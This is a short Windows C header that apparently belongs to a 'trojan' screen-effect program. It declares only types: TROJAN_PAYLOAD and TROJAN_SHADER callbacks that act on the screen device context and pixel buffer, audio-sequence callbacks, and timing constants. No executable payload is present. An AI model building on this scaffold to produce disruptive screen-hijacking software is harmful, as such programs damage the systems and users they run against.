#pragma once
#include <Windows.h>
#define PAYLOAD_TIME 10
#define AUDIO_NUM 5
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *PRGBQUAD;
typedef void(TROJAN_PAYLOAD)(int t, HDC hdcScreen);
typedef void(TROJAN_SHADER)(int t, int w, int h, PRGBQUAD prgbScreen);
typedef void(AUDIO_SEQUENCE)(int nSamplesPerSec, int nSampleCount, PSHORT psSamples), * PAUDIO_SEQUENCE;
typedef void(AUDIOSEQUENCE_OPERATION)(int nSamplesPerSec), * PAUDIO_SEQUENCE_OPERATION;
typedef struct tagAUDIO_SEQUENCE_PARAMS {int nSamplesPerSec; int nSampleCount; PAUDIO_SEQUENCE pAudioSequence; PAUDIO_SEQUENCE_OPERATION pPreAudioOp; PAUDIO_SEQUENCE_OPERATION pPostAudioOp;} AUDIO_SEQUENCE_PARAMS, * PAUDIO_SEQUENCE_PARAMS;